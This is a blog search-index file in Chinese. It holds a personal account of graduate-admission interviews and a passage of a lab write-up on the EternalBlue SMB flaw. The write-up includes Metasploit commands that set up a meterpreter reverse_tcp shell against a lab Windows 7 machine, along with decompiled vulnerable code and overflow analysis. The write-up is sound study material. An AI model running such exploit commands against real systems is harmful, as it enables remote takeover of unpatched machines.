<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>回忆在结束之后——记录保研</title>
      <link href="2021/10/11/%E5%9B%9E%E5%BF%86%E5%9C%A8%E7%BB%93%E6%9D%9F%E4%B9%8B%E5%90%8E%E2%80%94%E2%80%94%E8%AE%B0%E5%BD%95%E4%BF%9D%E7%A0%94/"/>
      <url>2021/10/11/%E5%9B%9E%E5%BF%86%E5%9C%A8%E7%BB%93%E6%9D%9F%E4%B9%8B%E5%90%8E%E2%80%94%E2%80%94%E8%AE%B0%E5%BD%95%E4%BF%9D%E7%A0%94/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/10/11/%E5%9B%9E%E5%BF%86%E5%9C%A8%E7%BB%93%E6%9D%9F%E4%B9%8B%E5%90%8E%E2%80%94%E2%80%94%E8%AE%B0%E5%BD%95%E4%BF%9D%E7%A0%94/8k%E6%97%A0%E5%AD%97.jpg" alt="8k无字"></p><p>在保研结束后根据回忆总结成的记录，包含了大量个人主观想法和碎碎念。</p><p>在繁忙的半年过后终于又有时间写博客了，这篇记录最开始写于9.18日晚，原来是在知乎与本科学校相关问题进行更新的，但问题被学校的无情铁拳车翻了……所以转移到自己的博客，修缮装点了门面，姑且作为三年的纪念。</p><a id="more"></a><h3 id="基本情况"><a href="#基本情况" class="headerlink" title="基本情况"></a>基本情况</h3><p>个人基本情况：北京某末流理工科985，cs专业，rk1%，六级536（参加夏令营时是452），若干国二国三竞赛，一篇三作论文在投，acm只有一个区域赛铜。</p><p>申请情况：</p><ul><li>夏令营<ul><li>复旦大学夏令营（入营，被刷）</li><li>上海交通大学软件学院夏令营ipads实验室（入营，专硕）</li><li>中科院计算所夏令营国重（入营，被刷）</li><li>北京大学信息科学技术学院夏令营软件所（入营，直博）</li><li>清华大学网研院夏令营（入营，优营）</li></ul></li><li>预推免<ul><li>清华大学网研院九推（入营，学硕）</li></ul></li></ul><p>最终选择去向：清华大学网研院学硕</p><h3 id="各院校情况"><a href="#各院校情况" class="headerlink" title="各院校情况"></a>各院校情况</h3><h4 id="复旦大学"><a href="#复旦大学" class="headerlink" title="复旦大学"></a>复旦大学</h4><p>复旦夏令营的入营通知是最早收到的，那时我正在临时抱编译原理的佛脚，短信把我从午觉偷懒中惊醒，正式拉开这漫长的三个月的序幕。</p><p>而其夏令营则是第二个开启的，与此同时的是我的编译原理大作业ddl，过上了白天夏令营，晚上赶ddl的幸福生活！</p><p>时间线</p><ul><li>6.2 提交报名材料</li><li>6.23 确认入围</li><li>7.5 英语面试</li><li>7.6 上午机试，下午面试</li><li>7.9 通知结果</li></ul><p>总体来说，复旦入围应该存在卡rk的情况，同学基本只有2%以内才能进，但真有这个排名也没什么人愿意去复旦，我当时也确实没怎么准备复旦，根据别人经验提前联系导师会很有用，但我估计最后肯定会鸽，就不给老师添麻烦了。</p><ul><li>英语面试难度并不是非常大，总共5min，自我介绍1-2min，之后就是英语提问，我比较菜外加设备的音响很差，所以问题基本没听清，估计不是非常理想。</li><li>机试不直接评分，总共三道题，写完后将代码和自己写的思路解释传给助教，总体难度不大，但估计存在卡时间和空间复杂度的情况，并且输入输出的情况非常诡异，如果想专项训练可以写写leetcode，题型非常相似。</li><li>面试则会根据机试来问一些算法和数据结构有关的问题，因此复习数据结构还是挺有用的，此外则会让你说自己进行过的项目，根据项目进行提问专业知识。</li></ul><p>结局：没过，886</p><h4 id="上海交通大学软件学院"><a href="#上海交通大学软件学院" class="headerlink" title="上海交通大学软件学院"></a>上海交通大学软件学院</h4><p>交大是唯一一个跑了大老远参与的夏令营，北京待了三年完全忘记了南方的夏天到底有多热了，特别是酒店里校门有两公里的时候……</p><p>交大的ipads实验室在系统上水平非常高，坚定读系统方向的同学将这里当第一志愿是完全不亏的，但我更倾向于读安全方向，所以对我来说并非最理想去处。</p><p>可以说是我准备时间最长的一个夏令营，这是因为需要选一篇他们实验室近两年的论文读透，到时候老师会根据论文提问，此外交大软院的机试也是独具特色，需要特殊准备，难受的是我同时还在准备另一个课程的ddl，最后就是高铁上码代码看论文，座位旁边的大叔还在做自己的简历，可以说是印象深刻了。</p><ul><li>6.25 提交材料</li><li>7.2 确认入围</li><li>7.5 发送活动安排与候选论文名单</li><li>7.11 报到</li><li>7.12 开营+机考</li><li>7.13 主题报告</li><li>7.14 面试</li><li>8.24 通知结果</li></ul><p>上海交通大学的电院存在明显的卡rk，软院相对好些，但也没好到哪里去，入营了九十人，一半以上是冲着ipads去的，可以说是招牌实验室了，其中南京大学的学生来了挺多的，应该算是他们的祖传出口单位。</p><ul><li>上交软院的机试别具特色，并非是以算法为主要考点，而是需要实现一个带UI的程序，实现一个相关的计算任务。任务分点给分，只有最后一点存在时间复杂度上的要求。值得注意的是，相比往年的软院机试，UI的分数占的比重是逐渐降低的，在往年甚至存在实时绘图的要求，但在这两年UI需求很小，分数也不高。我临时抱佛脚学的QT，在这次算是非常够用了，但是QT的一些语法并不非常熟练，这也导致我在二进制文件读取上磨蹭了很长时间，导致一些计算任务没有完成，因此我估计我机试分不高。</li><li>面试首先就是一段1min的英文自我介绍，我估计这段时间是让老师看看简历的。然后就是比较独特的论文提问环节，学生可以从一系列候选论文中挑一篇，候选论文列表会提前发放，在面试时则会围绕这一篇论文进行提问。候选论文基本上是ipads两三年内发表的优秀论文，我选的是XPC，因为感觉和系统安全有部分关系，实际上也确实有关，面试时会问比较细节的问题，建议一定要完全掌握论文，做好提纲后仔细想一想老师可能从哪些方面提问，如果能讲出一些自己的理解自然更好。我感觉自己论文问答部分没什么太大的问题，之后就是一些根据简历问的一些项目和专业有关的问题，这里不会太难，因为大部分时间都是在前面的论文问答环节。最后的英语问答环节，难度不大，但关于清华和交大更想去哪一个这样的问题确实有一些尖锐……</li></ul><p>结局：交大的结果等了很久才出来，当时手里有了一个offer，因为当时名次只能排到一个和华为合作的专硕，就直接放弃了。</p><h4 id="计算所"><a href="#计算所" class="headerlink" title="计算所"></a>计算所</h4><p>由于计算所是分实验室进行考核，同一实验室不同组的面试形式也会不一样，所以个人面试信息可能没什么参考价值，这一段就看一乐呵。</p><ul><li>6.13 提交材料</li><li>7.14 确认入围</li><li>7.19 导师私下面试</li><li>7.21 正式面试，当天知道结果</li></ul><p>因为倾向于系统安全方向，我报的是国重的w老师，收到计算所入围电话时是14号上午，我正在交大准备面试，电话里招生老师约我和w老师预先面试，我因为15-18号要赶着去沈阳打铁，所以就约在19号。19号天气不错，我骑着共享单车到了计算所楼下，不得不说计算所在外观上还真的挺像一个公司的，到了国重实验室好家伙一层密密麻麻全是工位，等了一小会就开始了w老师的个人面试。这场面试长达一个小时，虽然w老师态度很和蔼，但也带来了挺大压力，对着简历从头问到尾，从acm到ctf，从项目到比赛，从算法到专业课，真就写了什么就问什么。最后看他反应应该是挺满意的，但也表示不能马上给offer，我也没多想，还以为自己稳了，骑着车就回去了，太年轻，大意了大意了。</p><p>21号正式面试，我抱着12分的信心参加正式面试，首先就是1min的英文自我介绍，然后就是对着简历提问，大部分的问题都是和简历有关的专业问题，其中和编译器有关的专业问题我感觉答得不是很好，这我之前也确实没学过，最后问愿不愿意读博。面试完我自我感觉良好，回宿舍就开始放飞自我沉迷游戏，结果六点收到同为国重的L老师的邮件，表示我W老师没录上，有兴趣第二天可以来他那里看看，这让我心情非常糟糕，沉迷一晚上游戏麻痹自己。</p><p>第二天下午我出发去计算所，出来的时候还好，中途开始下起了滂沱大雨，这应该是我到北京以后见过的最大的一场雨，黑色的流水与浮沫在街面上漫延成汹涌的河，我只能躲在公交车站里不知所措。狼狈地到了计算所后见到了L老师，L老师人很好，还认识推荐我来的编译原理老师，当场说出了我还没出的编译原理成绩，事后证明也确实如此，但因为方向的原因没有达成共识。快晚上的时候W老师电话打来证实了这一消息，比较戏剧性的是他昨天被困在郑州，所以没有参与我的正式面试，但这也更多我自身实力不济有关。</p><p>结局：没过，886</p><h4 id="北京大学"><a href="#北京大学" class="headerlink" title="北京大学"></a>北京大学</h4><p>北大信科的推免过程对我来说从头到尾都处于迷雾当中，当时我面完计算所感觉自己处于人生的又一低谷，联系北大志愿报名志愿导师只有公式化回复，对于本来就希望渺茫北大完全放弃了准备，这能成为到手的第一个offer对我来说非常云里雾里莫名其妙，但也给了我很大的信心。</p><ul><li>6.10 纸质邮寄提交材料</li><li>7.24 入营名单公布</li><li>7.27 通知面试流程</li><li>7.28 身份检测</li><li>7.30 面试</li></ul><p>北大信科的硕士录取名额对于外校来说非常少，因此如果将这里当作第一目标的话，最好还是选择直博，但直博一般需要与导师提前联系，但我报的导师都没理我，想录我的导师我之前也不认识，这也是我为什么感到迷惑的重要原因。</p><p>北大信科软件所的直博面试预计用时30min，首先是给一段英文论文的摘要，朗读后立刻用中文翻译，我抽到是一篇机器学习与医疗有关的摘要，总体难度不大，但有些词不认识，翻译的时候也只好跳过部分。之后则是根据ppt做一段自我介绍，时长5min，ppt内容需要包括基本信息、部分课程成绩、项目科研、读博规划。其中部分课程成绩中要求列出擅长和不擅长的课程，当时我就很诚实地列了几个没怎么学导致成绩不高的课程，有个老师就盯着这个问了几分钟，我也只能瞎说了几分钟，以及另一位老师问了我一个写在角落里的还没完成的科创比赛，我从头到尾理了一遍这个项目的流程，但有几个老师的提问回答的不是很好</p><p>面完就感觉自己凉了，放飞自我沉迷游戏。结果在傍晚收到Z老师来电，Z老师比较年轻，是做系统软件方向的，后来查阅资料了解其团队的专业水平应该是非常高的，他在了解了我一部分情况向我说明了读博可能存在的风险和代价后询问我是否愿意读博，我半是理想主义半是自暴自弃，说了一堆情怀大话，现在想来我虽然希望能读博，但可能完全没有做好在一个不熟悉的方向和一个不曾了解的导师读博的准备。</p><p>结局：面试完成后的第二天获知结果，获得了直博的优秀营员，最终于九月份放弃。</p><h4 id="清华大学网研院"><a href="#清华大学网研院" class="headerlink" title="清华大学网研院"></a>清华大学网研院</h4><p>清华网研院——这是我保研过程的最终目标，为之相关的准备贯穿了我大三一整年。最早是在大二上卧病在床时了解到某学长去网研院读研，我对安全方向是非常感兴趣的，但打ctf的入门门槛确实比acm要高，因为一场大病和疫情就此搁置。后来大三上开始时这位学长正式入学，在本校的群里为实验室招实习生，我联系了网研院的Z老师来实验室实习打工，我个人不怎么争气，实习了快一年也没什么太好的成果，最后怀着忐忑的心情参加了夏令营和预推免。</p><ul><li>6.16 提交夏令营材料</li><li>6.25 夏令营入围通知</li><li>7.3 夏令营机试</li><li>7.4 各实验室宣讲</li><li>7.5 机试结果通知</li><li>8.30 推免材料提交</li><li>9.13 推免机试</li><li>9.17 推免面试</li></ul><p>清华网研院的夏令营主要由机试和方向宣讲组成，不发offer，主要提供志愿直博的学生与导师联系的机会。</p><ul><li>机试是重头戏，和贵系一起进行，今年是线上的机试，有在线OJ，IOI赛制，但只能看到自己成绩，一道签到、一道大模拟、一道图论，每题100分，难度递进非常明显，我比较菜只拿了115，在全体成员（包括贵系）中踩线50%，超过50%之后推免可以免机试，但我后来还是又考了一次。需要注意的是如果有前20%甚至更高的分数，对于联系导师等会非常有帮助。</li><li>方向宣讲则是各个实验室在不同的腾讯会议室里介绍介绍方向，我参加的实验室除了方向介绍之外还让所有参与会议的学生进行五分钟的自我介绍，这一操作的主要意义是让老师初步了解学生，比较奇葩的就是所有学生都能看见，各位大佬的履历让我更加感到自己前途渺茫。</li></ul><p>在惊险刺激的一系列夏令营过后迎来了正式的推免，推免的考核则是分为机试（10%）和面试，面试分为综合面试（5%）和专业面试（85%）。</p><ul><li>机试的形式和夏令营相同，因为夏令营成绩比较难看，所以选择再考一次，事实证明我夏令营不是发挥失常，这次成绩还是很难看，所幸比夏令营稍微好了一点，个人认为相比夏令营难度变化不大，区别是第三题主要考察数论+博弈论。</li><li>综合面试8分钟，从占比来看并非特别重要，首先是几个关于三观、为人、处事有关的中文问题（我问了担任过什么学生职务、有什么心得体会等），之后1min英文自我介绍，围绕提交的个人陈述中的项目进行英文提问，问题不会很深，重点是英文听说和对项目的概念性的理解，建议对自己项目中重点原理的概念的英文描述进行准备。</li><li>专业面试12分钟，首先是5min自我介绍ppt，接着围绕ppt进行提问，主要会根据科研项目内容进行提问，提问可能是项目的创新性、某一部分的实现原理、使用的某种方法的优缺点等，建议老老实实写，老老实实回答，主要是确认个人陈述内容的真实性。此外可能会问一些计算机网络的专业课问题，问了我TCP连接的建立和释放过程。</li></ul><p>结局：面试晚上九点邮件通知结果，上岸成功。</p><h3 id="无聊的结语"><a href="#无聊的结语" class="headerlink" title="无聊的结语"></a>无聊的结语</h3><p>接下来是一段没什么用处的拖沓小作文，大概是作者无病呻吟矫揉造作的产物……</p><p>时间回到推免面试完的中午，我背着线上面试用的三脚架，蹲在马路牙子上无所事事，可以尽人事之处到此结束，接下来的结果就不再是我可以掌控的了，说是听天由命也无妨。随便坐上了一辆公交车，直到终点站，再随意换上另一辆，煎熬而没营养地消磨挥霍时光，晃晃悠悠就是一下午过去，回到宿舍的我开始沉迷游戏但不完全沉迷，不得不说传说系列对我确实没什么吸引力，折磨一般的剧情和操作过后终于放弃了，《法官老爹》这部漫长的电影帮助我打发了这一天最后一段时间。这就是一个失去人生目标后，面对着巨大未知，自暴自弃自我唾弃的咸鱼般的生活，漫漫时光，似是没有尽头。</p><p>熬夜等待结果本是我那天的计划，因为按照往年的经验本应是第二天早上的电话做出最后的宣告，但今年的结局意外地以邮件的形式到来。我无数次设想过此时的场景，或许应该用一瓶冰啤酒在天台上作为纪念，但我既不会喝酒，天台也被锁了。就像往常一样，我下楼买了一瓶酸奶，但拐出了一旁的栏杆，晃晃悠悠，晃晃悠悠地绕着陌生的校园绕了一圈又一圈，最后蹲到了马路牙子上，喝着酸奶看着与故乡相仿却截然不同的车水马龙，回忆掠如风声。</p><p>我短暂的人生里又一个三年就此落幕，这与三年之前好像并没有什么不同，那时我也蹲在马路牙子上，但手里揣着高考成绩通知，最后因为蹲太久脚麻了，步履蹒跚地回到家中，从坏的选择中挑选一个不那么坏的。我憧憬高中时的自己，怀念那时冬日的清晨里苍白的阳光穿透咖啡杯上的雾气，但结局却让很多人失望，特别是我自己。大学时我过着放纵的生活，漫长的泅渡中疾病与惰性缠绕拖拽着我，却幸运地不曾沉下水面，实在感谢那些在远行途中陪伴帮助我的人与事，这也是留下这篇记录的初衷。</p>]]></content>
      
      
      
        <tags>
            
            <tag> life </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>永恒之蓝漏洞利用</title>
      <link href="2021/04/06/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
      <url>2021/04/06/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p><strong>第一次使用metasploit工具，并利用了windbg进行内核分析</strong></p><a id="more"></a><p><a href="https://blog.csdn.net/r250414958/article/details/84887574">https://blog.csdn.net/r250414958/article/details/84887574</a></p><p><a href="https://ti.qianxin.com/blog/articles/detailed-analysis-of-eternalblue/#:~:text=SMB_COM_NT_TRANSACT%3A,%E7%94%A8%E4%BA%8E%E6%89%93%E5%BC%80%E6%88%96%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E6%96%87%E4%BB%B6%E6%88%96%E6%96%87%E4%BB%B6%E5%A4%B9%EF%BC%8C%E5%B9%B6%E5%BA%94%E7%94%A8%E6%89%A9%E5%B1%95%E5%B1%9E%E6%80%A7EA%E6%88%96%E5%AE%89%E5%85%A8%E6%8F%8F%E8%BF%B0%E7%AC%A6SD%20%E5%85%B6%E4%B8%AD%E4%BA%A7%E7%94%9F%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%8D%B3%E4%B8%BA%E5%AF%B9%E5%BA%94%E7%9A%84SMB_COM_TRANSACTION2%E5%91%BD%E4%BB%A4%E3%80%82">https://ti.qianxin.com/blog/articles/detailed-analysis-of-eternalblue/#:~:text=SMB_COM_NT_TRANSACT%3A,%E7%94%A8%E4%BA%8E%E6%89%93%E5%BC%80%E6%88%96%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E6%96%87%E4%BB%B6%E6%88%96%E6%96%87%E4%BB%B6%E5%A4%B9%EF%BC%8C%E5%B9%B6%E5%BA%94%E7%94%A8%E6%89%A9%E5%B1%95%E5%B1%9E%E6%80%A7EA%E6%88%96%E5%AE%89%E5%85%A8%E6%8F%8F%E8%BF%B0%E7%AC%A6SD%20%E5%85%B6%E4%B8%AD%E4%BA%A7%E7%94%9F%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%8D%B3%E4%B8%BA%E5%AF%B9%E5%BA%94%E7%9A%84SMB_COM_TRANSACTION2%E5%91%BD%E4%BB%A4%E3%80%82</a></p><p><a href="https://blog.csdn.net/qq_27446553/article/details/73480807?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-2.control&amp;dist_request_id=&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-2.control">https://blog.csdn.net/qq_27446553/article/details/73480807?utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-2.control&amp;dist_request_id=&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-2.control</a></p><p>渗透靶场、exploit脚本</p><h2 id="利用MSF框架进行简单攻击"><a href="#利用MSF框架进行简单攻击" class="headerlink" title="利用MSF框架进行简单攻击"></a>利用MSF框架进行简单攻击</h2><p>攻击机：Kali系统   </p><p>目标机1：Win7 x86   192.168.171.141</p><p>目标机2：Win7 x64   192.168.171.141</p><p>调用nmap对目标机1的端口进行扫描，发现了445端口</p><img src="/2021/04/06/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20210409164440462.png" alt="image-20210409164440462" style="zoom:67%;"><p>输入<code>msfconsole</code>启动metasploit，查找ms17有关的模块</p><p><img src="/2021/04/06/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20210409165111377.png" alt="image-20210409165111377"></p><p>使用<code>smb_ms17_010</code>模块检测目标机是否含有漏洞</p><p><img src="/2021/04/06/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20210409165351985.png" alt="image-20210409165351985"></p><p>使用<code>ms17_010_psexec</code>模块获取目标机权限</p><p><img src="/2021/04/06/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20210409165555421.png" alt="image-20210409165555421"></p><p>查看目标机ip，与之前一致</p><img src="/2021/04/06/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20210409170017784.png" alt="image-20210409170017784" style="zoom:67%;"><h3 id="漏洞原理分析"><a href="#漏洞原理分析" class="headerlink" title="漏洞原理分析"></a>漏洞原理分析</h3><p>该漏洞出现在Windows的SMB服务（服务器消息块协议，用于共享文件等），SMB服务使用IP地址访问时，使用445端口。</p><p>对目标机2（32位win7）采用以下攻击（32位的win7攻击模块需要自行配置）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/windows/smb/eternalblue_doublepulsar </span><br><span class="line">msf exploit(windows/smb/eternalblue_doublepulsar) &gt; <span class="built_in">set</span> lhost 192.168.171.134   </span><br><span class="line">msf exploit(windows/smb/eternalblue_doublepulsar) &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(windows/smb/eternalblue_doublepulsar) &gt; <span class="built_in">set</span> rhost 192.168.171.143    </span><br><span class="line">msf exploit(windows/smb/eternalblue_doublepulsar) &gt; <span class="built_in">set</span> processinject explorer.exe </span><br><span class="line">msf exploit(windows/smb/eternalblue_doublepulsar) &gt; run</span><br></pre></td></tr></table></figure><p>需要使用windbg对目标机2进行调试</p><p>安装后门前的表</p><img src="/2021/04/06/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20210418153938467.png" alt="image-20210418153938467" style="zoom:67%;"><p>安装后门后的表</p><img src="/2021/04/06/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20210418153907477.png" alt="image-20210418153907477" style="zoom:67%;"><p>下一个硬件断点<code>ba e1 0xFFDFF1F1</code>命中断点，查看堆栈，栈顶即是返回地址</p><img src="/2021/04/06/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20210418155226658.png" alt="image-20210418155226658" style="zoom:67%;"><p>查到了是来自srvnet.sys模块的!SrvNetCommonReceiveHandler+0x94</p><p><img src="/2021/04/06/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20210418155424536.png" alt="image-20210418155424536"></p><p>查看一下调用堆栈，可以追溯到SrvNetWskReceiveComplete+0x72</p><p><img src="/2021/04/06/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20210418165945612.png" alt="image-20210418165945612"></p><h4 id="关键漏洞分析"><a href="#关键漏洞分析" class="headerlink" title="关键漏洞分析"></a>关键漏洞分析</h4><p>CVE-2017-0144，可引发内存越界写，通过SMB协议的命令SMB_COM_TRANSACTION2触发，该命令会将数据包中的FEA_LIST转换为NTFEA_LIST，漏洞出现在函数SrvOs2FeaListToNt，该函数会调动函数SrvOs2FeaListSizeToNt计算FEA_LIST长度</p><p>SrvOs2FeaListSizeToNt函数中会将WORD型数据拷贝到DWORD中，只要原变量初始值大于FFFF，就可以伪造长度更长的长度，通过这一漏洞，攻击者可以伪造超长的FEA_LIST。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __stdcall <span class="title">SrvOs2FeaListSizeToNt</span><span class="params">(_DWORD *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _WORD *v1; <span class="comment">// eax@1</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// edi@1</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// esi@1</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// ebx@3</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [sp+Ch] [bp-4h]@1</span></span><br><span class="line"></span><br><span class="line">  v1 = a1;                     <span class="comment">//*********</span></span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v2 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)a1 + *a1;</span><br><span class="line">  v3 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(a1 + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(a1 + <span class="number">1</span>) &lt; v2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( v3 + <span class="number">4</span> &lt; v2 )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = *(_WORD *)(v3 + <span class="number">2</span>) + *(_BYTE *)(v3 + <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v4 + v3 + <span class="number">4</span> + <span class="number">1</span> &gt; v2 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( RtlSizeTAdd(v6, (v4 + <span class="number">12</span>) &amp; <span class="number">0xFFFFFFFC</span>, &amp;v6) &lt; <span class="number">0</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      v3 += v4 + <span class="number">5</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v3 &gt;= v2 )</span><br><span class="line">        <span class="keyword">return</span> v6;</span><br><span class="line">      v1 = a1;</span><br><span class="line">    &#125;</span><br><span class="line">    *v1 = (_WORD)(v3 - v1);    <span class="comment">// ******</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在对应处下断点，这里本来试图将FEALIST大小从00010000缩小到0000ff5d</p><p><img src="/2021/04/06/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20210419193033970.png" alt="image-20210419193033970"></p><p>但却被转换成0001ff5d，结构变大，导致在之后使用错误长度进行memmove，导致pool溢出，造成一次越界写</p><img src="/2021/04/06/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20210419193146430.png" alt="image-20210419193146430" style="zoom:67%;"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">SRVNET_BUFFER</span>&#123;</span></span><br><span class="line"><span class="comment">//offset froom POOLHDR:0x10</span></span><br><span class="line">USHORT flag; <span class="comment">//0</span></span><br><span class="line"><span class="keyword">char</span> pad[<span class="number">2</span>]; </span><br><span class="line">LIST_ENTRY <span class="built_in">list</span>; <span class="comment">//4</span></span><br><span class="line"><span class="comment">//offset form SRVNET_BUFFER: 0x30</span></span><br><span class="line"><span class="keyword">char</span> *pnetBuffer; <span class="comment">//0C</span></span><br><span class="line">DWORD netbufSize; <span class="comment">//size of netBuffer 10h</span></span><br><span class="line">DWORD ioStatusInfo; <span class="comment">//copy Value of IRP.IOStatus.Information 14h</span></span><br><span class="line"><span class="comment">//offset from SRVNET_BUFFER:0x40</span></span><br><span class="line">MDL *pMdll; <span class="comment">//at offset 0x2c 18h</span></span><br><span class="line">DWORD nByteProcessed;  <span class="comment">//1ch</span></span><br><span class="line">DWORD Len;    <span class="comment">//20h</span></span><br><span class="line"><span class="comment">//offset from SRVNET_BUFFER:0x50</span></span><br><span class="line">PVOID Connection; <span class="comment">//size of this smb packet (from user) 24h</span></span><br><span class="line">DWORD unknown; <span class="comment">//28h</span></span><br><span class="line"><span class="comment">//MDL content starts at 0x2c</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>越界写的关键是修改了srvnet_buffer对象的MDL和指向srvnet_recv的指针，之后的数据（即shellcode）可以通过tcp栈拷贝到MDL指定的内存，断开所有连接后最终会根据srvnet_recv寻址，最终会调用写入的shellcode</p><p>断开所有连接后最终会调到函数srvnet!SrvNetWskReceiveComplete，该函数会调用写入的shellcode</p><h4 id="漏洞利用1"><a href="#漏洞利用1" class="headerlink" title="漏洞利用1"></a>漏洞利用1</h4><p>关键漏洞要求发送的FEA LIST长度大于0x10000，但实际上FEA LIST存在于SMB_COM_TRANSACTION2命令中，发送一次该命令的数据包总长度最大值只能是FFFF，因此需要采用别的方法发送该命令</p><p>先发送一个SMB_COM_NT_TRANSACT，再发送多个SMB_COM_TRANSACTION2_SECONDARY命令，服务器接受到后会按照SMB_COM_TRANSACTION2处理</p><h4 id="漏洞利用2"><a href="#漏洞利用2" class="headerlink" 